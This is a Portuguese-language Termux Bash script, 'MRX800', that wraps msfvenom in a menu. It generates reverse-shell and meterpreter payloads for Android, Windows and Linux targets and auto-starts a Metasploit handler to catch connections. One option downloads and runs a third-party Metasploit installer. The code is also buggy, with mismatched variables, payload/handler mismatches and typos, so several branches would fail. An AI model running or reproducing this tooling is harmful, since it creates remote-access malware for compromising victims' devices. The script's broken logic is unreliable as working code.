#! /data/data/com.termux/files/home/usr/bin/bash/
#
#
clear
#
figlet MRX800; sleep 2
clear
#
#
#Limpar a tela
clear
#
#Escrever MSVENOM
figlet MSFVENOM
#
#
#MENU
echo
echo '======================================='
echo '= \033[1;36m[\033[1;36m1]>> \033[1;33mCriar payload'
echo '= \033[1;36m[\033[1;36m2]>> \033[1;33mInstalar Metasploit'
echo '= \033[1;36m[\033[1;36m3]>> \033[1;33mSair'
echo '======================================='
echo
#Escolher entre 1 2 ou 3
#obrigado por usar
read -p "[+]>>" num
#
if [ "$num" = "1" ];then
clear
figlet System; sleep 1
echo
  echo "\033[1;32m\n\n[+]=>ESCOLHA O SISTEMA OPERACIONAL PARA FAZER O ATAQUE"; sleep 1
echo
   echo "\033[1;36m[\033[1;36m1]>> \033[1;33mAndroid"
   echo "\033[1;36m[\033[1;36m2]>> \033[1;33mWindows"
   echo "\033[1;36m[\033[1;36m3]>> \033[1;33mLinux"
echo
read -p "[+]=>" sys
fi
if [ "$sys" = "1" ];then
clear
figlet Android; sleep 1
echo
  echo "\033[1;32m\n\n[+]=>ESCOLHA O TIPO DE PAYLOAD PARA FAZER O ATAQUE"
echo
   echo "\033[1;36m[\033[1;36m1]>> \033[1;33m/meterpreter/reverse_tcp"
   echo "\033[1;36m[\033[1;36m2]>> \033[1;33m/meterpreter/reverse_http"
   echo "\033[1;36m[\033[1;36m3]>> \033[1;33m/meterpreter/reverse_https"
   echo "\033[1;36m[\033[1;36m4]>> \033[1;33m/shell/reverse_tcp"
   echo "\033[1;36m[\033[1;36m5]>> \033[1;33m/shell/reverse_http"
   echo "\033[1;36m[\033[1;36m6]>> \033[1;33m/shell/reverse_https"
echo
read -p "[+]=>" payload
fi
if [ "$payload" = "1" ];then
clear
#
echo "\033[1;32m\n\n[+]=>DIGITE SEU IP (Ex: 127.0.0.1)"
read -p "[+]=>" ip
#
echo "\033[1;32m\n\n[+]=>DIGITE A PORTA QUE VOCE QUER USAR (Ex:4444)"
read -p "[+]=>" port
#
echo "\033[1;32m\n\n[+]=>DIGITE O NOME DA PAYLOAD"
read -p "[+]=>" nome
echo
echo "Generating..................................."
#
#Gerando a Payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > /sdcard/$nome.apk
#
#Configurando e iniciando o metasploit

    echo "use exploit/multi/handler" >> .configsploit.rc
    echo "set payload android/meterpreter/reverse_tcp" >> .configsploit.rc
    echo "set lhost $ip" >> .configsploit.rc
    echo "set lport $port" >> .configsploit.rc
    echo "exploit" >> .configsploit.rc
    msfconsole -r .configsploit.rc
    sleep 1
    rm -rf .configsploit
    exit
fi
if [ "$payload" = "2" ];then
clear
#
echo "\033[1;32m\n\n[+]=>DIGITE SEU IP (Rx:127.0.0.1)"
read -p "[+]=>" ip2
#
echo "\033[1;32m\n\n[+]=>DIGITE A PORTA QUE VOCE QUER USAR (Ex:4444)"
read -p "[+]=>" port2
#
echo "\033[1;32m\n\n[+]=>DIGITE O DA PAYLOAD"
read -p "[+]=>" name
echo
echo "Generating......................................."
#
#Configurando a Payload
msfvenom -p android/meterpreter/reverse_http LHOST=$ip2 LPORT=$port2 R > /sdcard/$nome.apk
#
#Configurando o metasploit
echo
   echo "use exploit/multi/handler" >> .metaconftmp.rc
   echo "set payload android/meterpreter/reverse_http" >> .metaconftmp.rc
   echo "set lhost $ip2" >> .metaconftmp.rc
   echo "set lport $port2" >> .metaconftmp.rc
   echo "exploit" >> .metaconftmp.rc
   msfconsole -r .metaconftmp.rc
   sleep 1
   rm -rf .metaconftmp.rc
   exit
fi
if [ "$payload" = "3" ];then
clear
echo "\033[1;32m\n\n[+]=>DIGITE SEU IP (Ex:127.0.0.1)"
read -p "[+]=>" ip3
#
echo "\033[1;32m\n\n[+]=>DIGITE A PORTA QUE VOCE QUER USAR (Ex:4444)"
read -p "[+]=>" port3
#
echo "\033[1;32m\n\n[+]=>DIGITE O NOME DA PAYLOAD"
read -p "[+]=>" nome3
echo
echo "Generating......................................"
#Configurando a Payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$port3 R > /sdcard/teste.apk
#
#Configurando o metasploit
echo
   echo "use exploit/multi/handler" >> .meyaconftmp.rc
   echo "set payload android/meterpreter/reverse_https" >> .metaconftmp
   echo "set lhost $ip3" >> .metaconftmp.rc
   echo "set lport $port3" >> .metaconftmp.rc
   echo "exploit" >> .metaconftmp.rc
   msfconsole -r .metaconftmp.rc
   sleep 1
   rm -rf .metaconftmp.rc
   exit
fi
if [ "$payload" = "4" ];then
clear
echo "\033[1;32m\n\n[+]=>DIGITE SEU IP (Ex:127.0.0.1)"
read -p "[+]=>" ip4
#
echo "\033[1;32m\n\n[+]=>DIGITE A PORTA QUE VOCE QUER USAR (Ex:4444)"
read -p "[+]=>" port4
#
echo "\033[1;32m\n\n[+]=>DIGITE O NOME DA PAYLOAD"
read -p "[+]=>" name4
echo
echo "Generating..................................."
#
#Configurando a Payload
msfvenom -p android/shell/reverse_tcp LHOST=$ip4 LPORT=$port4 R > /sdcard/$name4.apk
#
#Configurando o metasploit
echo
   echo "use exploit/multi/handler" >> .metaconftmp.rc
   echo "set payload android/shell/reverse_tcp" >> .metaconftmp.rc
   echo "set lhost $ip4" >> .metaconftmp.rc
   echo "set lport $port4" >> .metaconftmp.rc
   echo "exploit" >> .metaconftmp.rc
   msfconsole -r .metaconftmp.rc
   sleep 1
   rm -rf .metaconftmp.rc
   exit
fi
if [ "$payload" = "5" ];then
clear
echo "\033[1;32m\n\n[+]=>DIGITE SEU IP (Ex:127.0.0.1)"
read -p "[+]=>" ip5
#
echo "\033[1;32m\n\n[+]=>DIGITE A PORTA QUE VOCE QUER USAR (Ex:4444)"
read -p "[+]=>" port5
#
echo "\033[1;32m\n\n[+]=>DIGITE O NOME DA PAYLOAD"
read -p "[+]=>" name5
#
echo
echo "Generating......................................."
#
#Confogurando o ataque
msfvenom -p android/shell/reverse_http LHOST=$ip5 LPORT=$port5 R > /sdcard/$name5.apk
#
#
echo
   echo "use exploit/multi/handler" >> configsploit.rc
   echo "set PAYLOAD android/shell/reverse_http" >> .configsploit.rc
   echo "set lhost $ip5" >> .configsploit.rc
   echo "set lport $port5" >> .configsploit.rc
   echo "exploit -j" >> .configsploit.rc
   msfconsole -r .configsploit.rc
   sleep 1
   rm -rf .configsploit.rc
   exit
fi
if [ "$payload" = "6" ];then
clear
echo "\033[1;32m\n\n[+]=>DIGITE SEU IP (Ex:127.0.0.1)"
read -p "[+]=>" ip6
#
echo "\033[1;32m\n\n[+]=>DIGITE A PORTA QUE VOCE QUER USAR (Ex:4444)"
read -p "[+]=>" port6
#
echo "\033[1;32m\n\n[+]=>DIGITE O NOME DA PAYLOAD"
read -p "[+]=>" name6
#
echo
echo "Generating...................................."
#
#Configurando o ataque
msfvenom -p android/shell/reverse_https LHOST=$ip6 LPORT=$port6 R > /sdcard/$name.apk
#
#
echo
   echo "use exploit/multi/handler" >> .configsploit.rc
   echo "set PAYLOAD android/shell/reverse_https" >> .configsploit.rc
   echo "set lhost $ip6" >> .configsploit.rc
   echo "set lport $port6" >> .configsploit
   echo "exploit -j" >> .configsploit.rc
   msfconsole -r .configsploit.rc
   sleep 1
   rm -rf .configsploit.rc
   exit
fi
if [ "$sys" = "2" ];then
clear
figlet Windows
echo
  echo "\033[1;32m\n\n[+]=>ESCOLHA O TIPO DE PAYLOAD PARA REALIZAR O ATAQUE"
echo
   echo "\033[1;36m[\033[1;36m1]>> \033[1;33m/meterpreter/reverse_tcp"
   echo "\033[1;36m[\033[1;36m2]>> \033[1;33m/meterpreter/reverse_http"
   echo "\033[1;36m[\033[1;36m3]>> \033[1;33m/meterpreter/reverse_https"
   echo "\033[1;36m[\033[1;36m4]>> \033[1;33m/shell/reverse_tcp"
   echo "\033[1;36m[\033[1;36m5]>> \033[1;33m/shell/reverse_http"
   echo "\033[1;36m[\033[1;36m6]>> \033[1;33m/shell/reverse_https"
echo
read -p "[+]=>" payload2
#
#
fi
if [ "$payload2" = "1" ];then
clear
echo "\033[1;32m\n\n[+]=>DIGITE SEU IP (Ex:127.0.0.1)"
read -p "[+]=>" ip
#
echo "\033[1;32m\n\n[+]=>DIGITE A PORTA QUE VPCE QUER USAR (Ex:4444)"
read -p "[+]=>" porta
#
echo "\033[1;32m\n\n[+]=>DIGITE O NOME DA PAYLOAD"
#
read -p "[+]=>" nome
#
echo
echo "Generating........................................"
#
#Configurando o ataque
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f exe > /sdcard/$nome.exe
#
#
echo
   echo "use exploit/multi/handler" >> .configsploit.rc
   echo "set payload windows/meterpreter/reverse_tcp" >> .configsploit.rc
   echo "set lhost $ip" >> .configsploit.rc
   echo "set lport $porta" >> .configsploit.rc
   echo "exploit -j" >> .configsploit.rc
   msfconsole -r configsploit.rc
   sleep 1
   rm -rf .configsploit.rc
   exit
fi
if [ "$payload2" = "2" ];then
clear
echo "\033[1;32m\n\n[+]=>DIGITE SEU IP"
read -p "[+]=>" ip2
#
echo "\033[1;32m\n\n[+]=>DIGITE A PORTA QUE VOCE QUER USAR (Ex:4444)"
read -p "[+]=>" porta2
#
echo "\033[1;32m\n\n[+]=>DIGITE O NOME DA PAYLOAD"
read -p "[+]=>" nome2
#
echo
echo "Generating.........................................."
#
#Configurando o ataque
msfvenom -p windows/meterpreter/reverse_http LHOST=$ip LPORT=$porta2 -f > /sdcard/$nome2.exe
#
#
echo
   echo "use exploit/multi/handler" >> .configsploit.rc
   echo "set payload windows/meterpreter/reverse_http" >> .configsploit.rc
   echo "set lhost $ip2" >> .configsploit.rc
   echo "set lport $porta2" >> .configsploit.rc
   echo "exploit -j" >> .configsploit.rc
   msfconsole -r .configsploit.rc
   sleep 1
   rm -rf .configsploit.rc
   exit
fi
if [ "$payload2" = "3" ];then
clear
echo "\033[1;32m\n\n[+]=>DIGITE SEU IP (Ex:127.0.0.1)"
read -p "[+]=>" ip3
#
echo "\033[1;32m\n\n[+]=>DIGITE A PORTA QUE VOCE QUER USAR (Ex:4444)"
read -p "[+]=>" porta3
#
echo "\033[1;32m\n\n[+]=>DIGITE O NOME DA PAYLOAD"
read -p "[+]=>" nome3
#
echo
echo "Generating......................................"
#
#Configuração de ataque
msfvenom -p windows/meterpreter/reverse_https LHOST=$ip3 LPORT=$porta3 -f exe > /sdcard/$nome3.exe
#
echo
   echo "use exploit/multi/handler" >> .configsploit.rc
   echo "set payload windows/meterpreter/reverse_https" >> .configsploit.rc
   echo "set lhost $ip3" >> .configsploit.rc
   echo "set lport $porta3" >> .configsploit.rc
   echo "exploit -j" >> .configsploit.rc
   msfconsole -r .configsploit.rc
   sleep 1
   rm -rf .configsploit.rc
   exit
fi
if [ "$payload2" = "4" ];then
clear
echo "\033[1;32m\n\n[+]=>DIGITE SEU IP (Ex:127.0.0.1)"
read -p "[+]=>" ip4
#
echo "\033[1;32m\n\n[+]=>DIGITE A PORTA QUE VOCE QUER USAR (Ex:4444)" 
read -p "[+]=>" porta4
#
echo "\033[1;32m\n\n[+]=>DIGITE O NOME DA PAYLOAD"
read -p "[+]=>" nome4
#
echo
echo "Generating......................................"
#Configuração de ataque
msfvenom -p windows/shell/reverse_tcp LHOST=$ip4 LPORT=$porta4 -f exe > /sdcard/$nome4.exe
#
echo
   echo "use exploit/multi/handler" >> .configsploit.rc
   echo "set payload windows/shell/reverse_tcp" >> .configsploit.rc
   echo "set lport $porta4" >> .configsploit.rc
   echo "set lhost $ip4" >> .configsploit.rc
   echo "exploit -j" >> .configsploit.rc
   msfconsole -r .configsploit.rc
   sleep 1
   rm -rf .configsploit.rc
   exit
fi
if [ "$payload2" = "5" ];then
clear
echo "\033[1;32m\n\n[+]=>DIGITE SEU IP (Ex:127.0.0.1)"
read -p "[+]=>" ip5
#
echo "\033[1;32m\n\n[+]=>DIGITE A PORTA QUE VOCE QUER USAR (Ex:4444)"
read -p "[+]=>" porta5
#
echo "\033[1;32m\n\n[+]=>DIGITE O NOME DA PAYLOAD"
read -p "[+]=>" nome5
#
echo
echo "Generating......................................."
#
#Configuração de ataque
msfvenom -p windows/shell/reverse_http LHOST=$ip5 LPORT=$porta5 -f exe > /sdcard/$nome5.exe
#
echo
   echo "use exploit/multi/handler" >> .configsploit.rc
   echo "set payload windows/shell/reverse_https" >> configsploit.rc
   echo "set lhost $ip5" >> .configsploit.rc
   echo "set lport $porta5" >> .configsploit.rc
   echo "exploit -j" >> .configsploit.rc
   msfconsole -r .configsploit.rc
   sleep 1
   rm -rf .configsploit.rc
   exit
fi
if [ "$payload2" = "6" ];then
clear
echo "\033[1;32m\n\n[+]=>DIGITE O SEU IP (Ex:127.0.0.1)"
read -p "[+]=>" ip6
#
echo "\033[1;32m\n\n[+]=>DIGITE A PORTA QUE VOCE QUER USAR (Ex:4444)"
read -p "[+]=>" porta6
#
echo "\033[1;32m\n\n[+]=>DIGITE O NOME DA PAYLOAD"
read -p "[+]=>" nome6
#
echo
echo "Generating......................................."
#
#Configuração de ataque
msfvenom -p windows/shell/reverse_https LHOST=$ip6 LPORT=$porta6 -f exe > /sdcard/$nome.exe
#
echo
   echo "use exploit/multi/handler" >> .configsploit.rc
   echo "set payload windows/shell/reverse_https" >> .configsploit.rc
   echo "set lhost $ip6" >> .configsploit.rc
   echo "set lport $porta6" >> .configsploit.rc
   echo "exploit -j" >> .configsploit.rc
   msfconsole -r .configsploit.rc
   sleep 1
   rm -rf .configsploit.rc
   exit
fi
if [ "$sys" = "3" ];then
clear
figlet Linux
echo
   echo "\033[1;36m[\033[1;36m1]>> \033[1;33m/x86/meterpreter/reverse_tcp"
echo
read -p "[+]=>" payload3
fi
if [ "$payload3" = "1" ];then
clear
#
echo "\033[1;32m\n\n[+]=>DIGITE SEU IP (Ex:127.0.0.1)"
read -p "[+]>>" ip
#
echo "\033[1;32m\n\n[+]=>DIGITE A PORTA QUE VOCE QUER USAR (Ex:4444)"
read -p "[+]>>" porta
#
echo "\033[1;32m\n\n[+]=>DIGITE O NOME DA PAYLOAD"
read -p "[+]>>" nome
echo
echo "Generating..................................."
#configuração de ataque
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta R > /sdcard/$nome.apk
#
#
echo
   echo "use exploit/multi/handler" >> .linuxpayload.rc
   echo "set payload linux/meterpreter/reverse_tcp" >> .linuxpayload.rc
   echo "set lhost $ip" >> .linuxpayload.rc
   echo "set lport $porta" >> .linuxpayload.rc
   echo "exploit -j" >> .linuxpayload.rc
   msfcosnole -r .linuxpayload.rc
   sleep 1
   rm -rf .linuxpayload.rc
   exit
fi
if [ "$num" = "2" ];then
clear
figlet Metasploit
echo
   echo "\033[1;32m\n\n[+]=>INSTALANDO METASPLOIT"
#
pkg install curl
#
curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
#
chmod +x metasploit.sh
#
mv -v metasploit.sh /$HOME
#
cd /$HOME
#
./metasploit.sh
exit
fi
if [ "$num" = "3" ];then
clear
figlet Exit
exit
fi
exit
